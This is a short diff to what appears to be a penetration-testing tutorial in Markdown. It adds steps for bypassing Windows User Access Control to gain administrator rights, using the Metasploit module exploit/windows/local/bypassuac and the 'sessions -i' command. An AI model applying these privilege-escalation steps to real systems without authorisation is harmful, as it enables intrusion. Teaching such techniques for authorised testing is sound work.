@@ -119,6 +119,13 @@ We can view our session by using the
 ```
 sessions
  ```
-
+Now our target is to bypass User Access Control (UAC) to gain administrator access. To do so, follow the below steps. 
+### Step : Using UAC bypass payload 
+**Command**: 
+```use exploit/windows/local/bypassuac ```
+### Step : Check the pending required option and active 
+background sessions 
+**Command**: 
+```sessions -i```
 
 
